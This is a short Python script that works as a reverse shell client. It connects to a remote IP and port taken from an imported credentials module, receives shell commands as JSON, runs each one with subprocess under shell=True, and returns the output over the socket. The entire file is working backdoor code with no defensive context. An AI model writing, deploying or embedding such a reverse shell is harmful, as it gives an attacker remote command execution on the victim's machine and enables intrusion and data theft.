#! /usr/bin/python

import socket
import json
import subprocess

from ip_cred import IP, PORT

def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode("utf-8"))

def reliable_recv():
	data = ""
	while True:
		try:
			data = data + sock.recv(1024).decode("utf-8")
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break
		else:
			proc  = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read() # executes received command
			reliable_send(result.decode("utf-8"))
			#message = "Hello World"
			#sock.send(message.encode("utf-8"))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((IP, PORT))

shell()

sock.close()

